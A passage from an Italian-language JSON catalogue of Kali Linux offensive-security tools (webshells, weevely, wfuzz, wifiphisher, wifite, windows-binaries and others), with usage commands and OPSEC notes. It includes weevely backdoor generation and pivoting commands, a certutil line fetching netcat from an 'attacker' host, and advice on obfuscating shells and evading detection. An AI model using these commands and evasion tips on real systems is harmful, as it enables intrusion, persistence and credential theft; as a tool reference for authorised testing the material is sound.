maggiore stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "webshells",
    "name": "webshells",
    "version": "1.1",
    "icon": "../app/icons/webshells-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/webshells/",
    "desc": "Collezione di webshell PHP, ASP, JSP, ASPX per post-exploitation su server web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Webshells è una collezione curata di webshell per diverse tecnologie server-side (PHP, ASP, ASPX, JSP, CFM). Include shell minimali per evasion, shell con GUI completa, e varianti specializzate per diverse necessità di post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language:</strong> webshell per PHP, ASP, ASPX, JSP e altri linguaggi server</p><p><strong>Feature Variety:</strong> da one-liner a shell complete con file manager e database access</p><p><strong>Size Options:</strong> shell minimali per evasion o complete per funzionalità avanzate</p><p><strong>Ready to Use:</strong> shell pronte per upload dopo file upload vulnerability</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Localizzazione shell\nls /usr/share/webshells/\n\n# Shell PHP semplice\ncat /usr/share/webshells/php/simple-backdoor.php\n\n# Shell ASPX\ncat /usr/share/webshells/aspx/cmdasp.aspx</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation</strong>, mantenere accesso dopo sfruttamento di file upload. Per <strong>Pivoting</strong>, usare server web compromesso per accedere a rete interna. Per <strong>Reference</strong>, studiare tecniche di webshell per detection e hunting.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> webshell note sono signature in tutti gli AV e WAF. Upload lascia tracce nei log server. File anomali rilevati da file integrity monitoring. Modificare e offuscare shell prima dell'uso in engagement reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "websploit",
    "name": "websploit",
    "version": "4.0.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/websploit/",
    "desc": "Framework per vulnerability scanning e exploit web con moduli automatizzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WebSploit è un framework modulare per penetration testing web e network. Combina scanner di vulnerabilità, moduli di exploit e tool di social engineering in un'interfaccia unificata simile a Metasploit per attacchi automatizzati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Modules:</strong> scanner per vulnerabilità web comuni e CMS specifici</p><p><strong>Network Attacks:</strong> moduli per ARP spoofing, DNS hijacking e MITM</p><p><strong>Social Engineering:</strong> integrazione con tool di phishing e credential harvesting</p><p><strong>Autopwn:</strong> sfruttamento automatico di vulnerabilità rilevate</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia WebSploit\nwebsploit\n\n# Lista moduli disponibili\nshow modules\n\n# Usa modulo specifico\nuse web/dir_scanner\n\n# Configura target\nset target http://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Automated Testing</strong>, scansione rapida di applicazioni web per vulnerabilità note. Per <strong>Network Attacks</strong>, eseguire attacchi MITM e spoofing in ambiente controllato. Per <strong>Learning</strong>, comprendere diverse tecniche di attacco in framework unificato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> moduli generano traffico facilmente identificabile. Pattern di attacco sono signature note. MITM e spoofing causano anomalie di rete evidenti. Usare solo in ambiente lab o con autorizzazione esplicita.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "weevely",
    "name": "weevely",
    "version": "4.0.2",
    "icon": "../app/icons/weevely-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/weevely/",
    "desc": "Webshell PHP stealth con crittografia, 30+ moduli per post-exploitation avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Weevely è una webshell PHP stealth progettata per post-exploitation avanzata. Genera backdoor offuscate con comunicazione crittografata e offre 30+ moduli per file management, pivoting, privilege escalation e persistence su server web compromessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Encrypted Communication:</strong> traffico C2 crittografato nascosto in parametri legittimi</p><p><strong>30+ Modules:</strong> file manager, port scanner, SQL client, bruteforcer integrati</p><p><strong>Obfuscated Agent:</strong> backdoor PHP minimale e offuscata per evitare detection</p><p><strong>Pivoting:</strong> tunnel TCP e proxy SOCKS per accesso a rete interna</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera backdoor con obfuscation avanzata\nweevely generate Str0ngP4ss! /tmp/agent.php\n\n# Connetti e avvia sessione interattiva\nweevely http://target.com/uploads/agent.php Str0ngP4ss!\n\n# Moduli post-exploitation avanzati:\n:system_info              # Info sistema\n:audit_phpconf            # Audit configurazione PHP\n:file_find / -name *.conf # Cerca file configurazione\n:sql_console -user root -passwd '' -host localhost  # MySQL shell\n\n# Pivoting: crea tunnel SOCKS\n:net_proxy                # SOCKS5 per accesso rete interna\nproxychains nmap -sT 10.0.0.0/24\n\n# Port forwarding per accesso servizi interni\n:net_portfwd -lport 3306 -rhost 10.0.0.5 -rport 3306\nmysql -h 127.0.0.1 -P 3306 -u root\n\n# Privilege escalation enumeration\n:audit_suidsgid           # Trova SUID/SGID\n:audit_etcpasswd          # Check permessi /etc/passwd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Stealth Persistence</strong>, mantenere accesso con comunicazioni crittografate difficili da rilevare. Per <strong>Post-Exploitation</strong>, eseguire reconnaissance e lateral movement da server web. Per <strong>Pivoting</strong>, usare server compromesso come punto di ingresso nella rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> file PHP può essere trovato da scansioni AV server-side. Pattern di comunicazione, seppur crittografati, hanno caratteristiche rilevabili. Moduli aggressivi generano attività anomala. Usare con cautela e cleanup appropriato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "wfuzz",
    "name": "wfuzz",
    "version": "3.1.0",
    "icon": "../app/icons/wfuzz-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wfuzz/",
    "desc": "Fuzzer web per brute force directory, parametri, header e autenticazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wfuzz è un fuzzer web flessibile per brute force di directory, parametri, header e autenticazione. Supporta injection di payload in qualsiasi parte della request HTTP con filtering avanzato delle risposte per identificare risultati interessanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Position Fuzzing:</strong> inietta payload in URL, header, body, cookie simultaneamente</p><p><strong>Advanced Filtering:</strong> filtra risposte per status code, lunghezza, parole, linee, regex</p><p><strong>Encoders:</strong> encoding automatico dei payload (URL, base64, HTML, hash)</p><p><strong>Recursion:</strong> fuzzing ricorsivo per directory discovery approfondita</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory bruteforce con estensioni multiple\nwfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -z list,-.php-.html-.txt-.bak --hc 404 http://target.com/FUZZFUZ2Z\n\n# IDOR testing con range numerico\nwfuzz -c -z range,1-1000 --hc 403,404 --hh 0 http://target.com/api/user/FUZZ/profile\n\n# Auth bypass con header injection\nwfuzz -c -w /usr/share/seclists/Fuzzing/headers-injection.txt \\\n  -H \"X-Forwarded-For: FUZZ\" --hc 403 http://target.com/admin\n\n# Subdomain bruteforce via Host header\nwfuzz -c -w subdomains.txt -H \"Host: FUZZ.target.com\" --hc 404 --hw 0 http://target.com\n\n# SQLi fuzzing su parametro POST\nwfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \\\n  -d \"username=admin&amp;password=FUZZ\" --hs \"Invalid\" http://target.com/login\n\n# Recursive discovery con output JSON\nwfuzz -c -R 2 -w wordlist.txt --hc 404 -o json http://target.com/FUZZ 2&gt;results.json\n\n# Multi-threading con delay per evasione\nwfuzz -c -t 5 -s 0.5 -w wordlist.txt --hc 404 http://target.com/FUZZ</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trovare file, directory e endpoint nascosti. Per <strong>Parameter Brute Force</strong>, identificare parametri accettati da endpoint. Per <strong>Auth Testing</strong>, testare credenziali e bypass autenticazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> alto volume di request genera alert su WAF e IDS. Pattern di fuzzing sono facilmente identificabili. Rate limiting può bloccare scansione. Usare delay tra request e proxy rotation per ridurre detection.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "whatweb",
    "name": "whatweb",
    "version": "0.6.2",
    "icon": "../app/icons/whatweb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/whatweb/",
    "desc": "Identifica tecnologie web: CMS, framework, server, plugin con 1800+ fingerprint.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WhatWeb è uno scanner di fingerprinting web che identifica tecnologie utilizzate dai siti web. Con 1800+ plugin riconosce CMS, framework, server web, librerie JavaScript, widget e altre componenti analizzando header, HTML, cookie e comportamenti specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>1800+ Plugins:</strong> riconoscimento di CMS, framework, server, analytics e molto altro</p><p><strong>Aggression Levels:</strong> da passivo (singola request) ad aggressivo (multiple probe)</p><p><strong>Version Detection:</strong> identifica versioni specifiche per vulnerability matching</p><p><strong>Flexible Output:</strong> output in JSON, XML, SQL, verbose per integrazione pipeline</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan singolo target\nwhatweb https://target.com\n\n# Scan aggressivo con versioni\nwhatweb -a 3 https://target.com\n\n# Output JSON\nwhatweb --log-json=output.json https://target.com\n\n# Scan range IP\nwhatweb 192.168.1.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Technology Profiling</strong>, mappare stack tecnologico di target web. Per <strong>Vulnerability Research</strong>, identificare versioni per cercare CVE note. Per <strong>Asset Discovery</strong>, catalogare tecnologie su range di IP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> livello aggressivo genera multiple request rilevabili. User-Agent WhatWeb è signature nota. Scansione di range genera traffico anomalo. Usare livello passivo e proxy per ridurre fingerprint.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "wifi-honey",
    "name": "wifi-honey",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifi-honey/",
    "desc": "Crea fake AP per cattura handshake WPA/WPA2 con deauth e beacon spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WiFi-Honey è uno script che automatizza la creazione di rogue access point per catturare handshake WPA/WPA2. Configura multiple interfacce wireless per creare AP fake con lo stesso ESSID del target mentre esegue attacchi deauth per forzare riconnessioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Rogue AP:</strong> crea access point fake con ESSID identico al target</p><p><strong>Deauth Attack:</strong> disconnette client dal vero AP per forzare riconnessione al fake</p><p><strong>Handshake Capture:</strong> cattura 4-way handshake WPA/WPA2 per offline cracking</p><p><strong>Multi-Interface:</strong> gestisce multiple interfacce per AP e deauth simultanei</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifi-honey\nwifi-honey <essid> <channel> <interface>\n\n# Esempio\nwifi-honey TargetNetwork 6 wlan0\n\n# Monitora handshake catturati\nairodump-ng wlan0mon</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Assessment</strong>, testare resistenza di rete wireless ad attacchi evil twin. Per <strong>Handshake Capture</strong>, ottenere material per password cracking offline. Per <strong>Client Security</strong>, verificare comportamento client con AP malevoli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> beacon frame duplicati sono rilevabili da WIDS. Deauth flood genera alert immediati. Richiede prossimità fisica al target. Interferenza RF può essere localizzata. Solo con autorizzazione in ambiente controllato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifiphisher",
    "name": "wifiphisher",
    "version": "1.4",
    "icon": "../app/icons/wifiphisher-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifiphisher/",
    "desc": "Framework rogue AP per phishing WiFi: cattura credenziali con captive portal fake.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wifiphisher è un framework per attacchi rogue AP che automatizza phishing WiFi tramite captive portal fake. Crea access point malevoli, disconnette utenti dalla rete legittima e presenta pagine di phishing per catturare password WPA, credenziali o distribuire malware.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated Deauth:</strong> disconnette automaticamente client dalla rete target</p><p><strong>Phishing Scenarios:</strong> template preconfigurati per firmware update, OAuth, captive portal</p><p><strong>Credential Capture:</strong> cattura password WiFi, login social, credenziali custom</p><p><strong>KARMA Attack:</strong> risponde a probe request di reti memorizzate dai client</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifiphisher interattivo\nsudo wifiphisher\n\n# Specifica interfaccia e scenario\nsudo wifiphisher -i wlan0 -p firmware-upgrade\n\n# Target specifico\nsudo wifiphisher --essid \"TargetNetwork\" -p oauth-login</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Phishing</strong>, testare consapevolezza utenti su attacchi evil twin. Per <strong>Credential Harvesting</strong>, catturare password WiFi o credenziali in engagement autorizzati. Per <strong>Social Engineering</strong>, distribuire payload tramite pagine di aggiornamento fake.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> rogue AP e deauth sono rilevabili da WIDS enterprise. Captive portal può essere identificato da utenti attenti. Richiede prossimità fisica. Attività è illegale senza autorizzazione esplicita.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifipumpkin3",
    "name": "wifipumpkin3",
    "version": "1.1.7",
    "icon": "../app/icons/wifipumpkin3-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifipumpkin3/",
    "desc": "Rogue AP framework con proxy, credential capture, MITM e plugin extensibility.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WiFi-Pumpkin3 è un framework avanzato per attacchi rogue AP con capacità MITM complete. Crea access point malevoli con proxy trasparente, cattura credenziali, inietta JavaScript, e offre architettura a plugin per estendere funzionalità di intercettazione e phishing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Rogue AP:</strong> crea AP con DHCP, DNS e routing automatici</p><p><strong>Transparent Proxy:</strong> intercetta traffico HTTP/HTTPS con SSLstrip</p><p><strong>Plugin System:</strong> moduli per JS injection, credential capture, image replacement</p><p><strong>Captive Portal:</strong> template phishing personalizzabili per social engineering</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifipumpkin3\nsudo wifipumpkin3\n\n# Configura AP\nwp3> set interface wlan0\nwp3> set ssid FreeWiFi\n\n# Avvia con proxy\nwp3> start\n\n# Abilita plugin\nwp3> use proxy</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MITM Testing</strong>, intercettare traffico in assessment wireless autorizzati. Per <strong>Credential Capture</strong>, catturare login trasmessi su connessioni non sicure. Per <strong>Security Awareness</strong>, dimostrare rischi di reti WiFi pubbliche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> rogue AP è rilevabile da WIDS e wireless IPS. Proxy intercept può generare warning certificato. Attività MITM lascia tracce nei log. Usare solo in ambiente controllato con autorizzazione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifite",
    "name": "wifite",
    "version": "2.7.0",
    "icon": "../app/icons/wifite-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifite/",
    "desc": "Auditing WiFi automatizzato: scansione, deauth, cattura handshake e crack WPA/WEP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wifite è uno strumento automatizzato per auditing di reti WiFi che orchestra l'intero processo di attacco wireless. Scansiona reti, seleziona target, esegue attacchi appropriati (WEP, WPA, WPS), cattura handshake e integra con tool di cracking per un workflow completo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated Workflow:</strong> gestisce automaticamente tutto il processo di attacco WiFi</p><p><strong>Multi-Attack:</strong> supporta WEP (ARP replay, chopchop), WPA (deauth, PMKID), WPS (Pixie, Reaver)</p><p><strong>Smart Targeting:</strong> seleziona automaticamente attacchi basati su target characteristics</p><p><strong>Tool Integration:</strong> integra aircrack-ng, hashcat, reaver, pixiewps per cracking</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifite (interattivo)\nsudo wifite\n\n# Target specifico per ESSID\nsudo wifite --essid \"TargetNetwork\"\n\n# Solo WPA\nsudo wifite --wpa\n\n# Infinito, tutti i target\nsudo wifite --all --infinite</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, assessment automatizzato di sicurezza reti wireless. Per <strong>Password Audit</strong>, verificare robustezza password WPA/WPA2. Per <strong>WPS Testing</strong>, identificare AP vulnerabili a attacchi WPS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> attacchi deauth e injection sono rilevabili da WIDS. Handshake capture richiede prossimità. Cracking avviene offline ma hash possono essere correlati. Usare solo su reti autorizzate.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wig-ng",
    "name": "wig-ng",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wig-ng/",
    "desc": "Web fingerprinting tool per identificare CMS, framework e componenti web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wig-ng (Web Information Gatherer Next Generation) è un tool di fingerprinting web che identifica CMS, framework e componenti tecnologiche analizzando risposte HTTP. È una versione migliorata di wig con database aggiornato e migliore accuratezza di detection.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CMS Detection:</strong> identifica WordPress, Joomla, Drupal e altri CMS popolari</p><p><strong>Framework Fingerprint:</strong> riconosce framework backend e frontend</p><p><strong>Version Detection:</strong> determina versioni specifiche per vulnerability matching</p><p><strong>Plugin/Theme Detection:</strong> identifica estensioni e temi installati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fingerprint target\nwig-ng http://target.com\n\n# Output verboso\nwig-ng -v http://target.com\n\n# Salva risultati\nwig-ng -o results.json http://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Technology Profiling</strong>, identificare stack tecnologico di applicazioni web. Per <strong>Vulnerability Assessment</strong>, determinare versioni per ricerca CVE. Per <strong>Attack Surface</strong>, mappare componenti per identificare vettori di attacco.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> request multiple per fingerprinting possono essere loggate. User-Agent identificabile. Pattern di accesso a file specifici può rivelare attività di reconnaissance.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "wig",
    "name": "wig",
    "version": "0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wig/",
    "desc": "Identifica CMS e plugin analizzando header, file statici e pattern specifici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wig (Web Information Gatherer) è uno strumento di fingerprinting che identifica CMS, plugin e tecnologie web analizzando header HTTP, file statici e pattern caratteristici. Costruisce un profilo tecnologico del target utile per identificare potenziali vulnerabilità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CMS Fingerprint:</strong> rileva WordPress, Joomla, Drupal, Magento e altri</p><p><strong>Plugin Detection:</strong> identifica plugin e estensioni installate</p><p><strong>Version Extraction:</strong> estrae numeri di versione da meta tag, file e header</p><p><strong>OS/Server Detection:</strong> identifica sistema operativo e web server</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan standard\nwig http://target.com\n\n# Scan con proxy\nwig -p http://proxy:8080 http://target.com\n\n# Output quieto\nwig -q http://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, raccogliere informazioni tecnologiche su target web. Per <strong>Vulnerability Research</strong>, identificare versioni per cercare exploit noti. Per <strong>Asset Inventory</strong>, catalogare tecnologie in assessment su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> accesso a path specifici per fingerprinting può essere loggato. Request a file caratteristici (readme.txt, license.txt) sono pattern riconoscibili. Usare rate limiting e proxy per ridurre visibilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "windows-binaries",
    "name": "windows-binaries",
    "version": "0.6.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/windows-binaries/",
    "desc": "Collezione binari Windows per pentesting: nc, wget, plink, accesschk e altri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Windows-binaries è una collezione di utility Windows precompilate essenziali per penetration testing. Include tool di networking (nc, wget), tunneling (plink), privilege escalation check (accesschk) e altre utility spesso necessarie dopo aver ottenuto accesso a sistemi Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Networking:</strong> netcat, wget, curl per trasferimento file e shell</p><p><strong>Tunneling:</strong> plink per SSH tunneling da Windows</p><p><strong>Enumeration:</strong> accesschk, whoami per privilege enumeration</p><p><strong>Ready to Deploy:</strong> binari statici pronti per upload su target</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Localizzazione binari\nls /usr/share/windows-binaries/\n\n# Copia su web server per transfer\ncp /usr/share/windows-binaries/nc.exe /var/www/html/\n\n# Usa su target Windows\n# certutil -urlcache -f http://attacker/nc.exe nc.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation</strong>, trasferire utility necessarie su sistemi Windows compromessi. Per <strong>Shell Upgrade</strong>, ottenere reverse shell più stabili con netcat. Per <strong>Pivoting</strong>, creare tunnel SSH attraverso sistemi Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> binari noti sono signature per AV. Upload di file genera eventi nei log. Esecuzione di tool come nc/plink è monitorata da EDR. Usare versioni offuscate o alternative LOLBAS quando possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "windows-privesc-check",
    "name": "windows-privesc-check",
    "version": "2.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/windows-privesc-check/",
    "desc": "Script per trovare misconfiguration di privilege escalation su sistemi Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Windows-privesc-check è uno script che enumera configurazioni di sicurezza Windows per identificare percorsi di privilege escalation. Analizza permessi di servizi, scheduled task, registry, file system e altre aree comuni di misconfiguration.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Service Enumeration:</strong> identifica servizi con permessi deboli o unquoted paths</p><p><strong>Registry Check:</strong> trova chiavi registry scrivibili per persistence</p><p><strong>File Permissions:</strong> enumera file e directory con ACL vulnerabili</p><p><strong>Scheduled Tasks:</strong> analizza task per privilege escalation</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Esegui enumeration completa\nwindows-privesc-check2.exe --audit -a -o report.txt\n\n# Solo servizi\nwindows-privesc-check2.exe --audit -s\n\n# Output HTML\nwindows-privesc-check2.exe --audit -a -o report.html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation</strong>, trovare percorsi per elevare privilegi da utente normale. Per <strong>Security Audit</strong>, verificare hardening di sistemi Windows. Per <strong>Post-Exploitation</strong>, enumerazione automatica dopo accesso iniziale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> enumeration genera eventi nei log di sistema. Query WMI e registry sono monitorate da EDR. Tool è signature nota per AV. Preferire tecniche manuali o WinPEAS per maggiore stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "notes": null
  },
  {
    "id": "wireshark-kali",
    "name": "wireshark",
    "version": "4.4.7",
    "icon": "../app/icons/wireshark-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wireshark/",
    "desc": "Analizzatore di protocolli di rete leader: cattura, dissect e analisi pacchetti GUI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wireshark è l'analizzatore di protocolli di rete più utilizzato al mondo. Cattura traffico in tempo reale e analizza file pcap con dissector per centinaia di protocolli, filtri potenti e visualizzazioni grafiche per troubleshooting, analisi di sicurezza e forensics di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Dissection:</strong> supporta 3000+ protocolli con decodifica automatica</p><p><strong>Live Capture:</strong> cattura traffico da interfacce ethernet, WiFi, USB e altro</p><p><strong>Display Filters:</strong> filtri potenti per isolare traffico di interesse</p><p><strong>Statistics:</strong> grafici, conversazioni, endpoints, protocol hierarchy</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\nwireshark\n\n# Cattura da CLI\ntshark -i eth0 -w capture.pcap\n\n# Filtro display\nwireshark -r capture.pcap -Y \"http.request\"\n\n# Estrai oggetti HTTP\ntshark -r capture.pcap --export-objects http,./output</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Forensics</strong>, analizzare traffico catturato per ricostruire attività. Per <strong>Malware Analysis</strong>, identificare C2 e exfiltration nel traffico. Per <strong>Troubleshooting</strong>, diagnosticare problemi di rete e applicazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> cattura passiva non genera traffico rilevabile. Interfaccia in promiscuous mode può essere rilevata da alcuni sistemi. Per cattura remota, traffic mirroring deve essere configurato su switch.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "witnessme",
    "name": "witnessme",
    "version": "1.5.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/witnessme/",
    "desc": "Screenshot web automatico per visual recon di applicazioni e servizi HTTP/HTTPS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WitnessMe è uno strumento per visual reconnaissance che automatizza la cattura di screenshot di servizi web. Naviga URL, scatta screenshot e organizza risultati in report HTML navigabili per identificare rapidamente applicazioni interessanti su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bulk Screenshots:</strong> cattura screenshot di centinaia di URL automaticamente</p><p><strong>Service Detection:</strong> identifica tecnologie web durante la cattura</p><p><strong>HTML Reports:</strong> genera gallery navigabile con tutti gli screenshot</p><p><strong>Signature Matching:</strong> rileva applicazioni note tramite pattern visivi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Screenshot da lista URL\nwitnessme screenshot -f urls.txt\n\n# Screenshot range IP\nwitnessme screenshot 192.168.1.0/24\n\n# Con output directory\nwitnessme screenshot -o output_dir -f urls.txt\n\n# Genera report\nwitnessme report output_dir</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Visual Reconnaissance</strong>, identificare rapidamente applicazioni web di interesse. Per <strong>Asset Discovery</strong>, catalogare visivamente servizi web in range IP. Per <strong>Default Credentials</strong>, identificare login page di device e applicazioni note.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> browser headless genera request con fingerprint identificabile. Alto volume di request può triggare rate limiting. User-Agent e header sono loggati. Usare delay e proxy per ridurre visibilità.</p><br><hr>",
    "best_in": false,
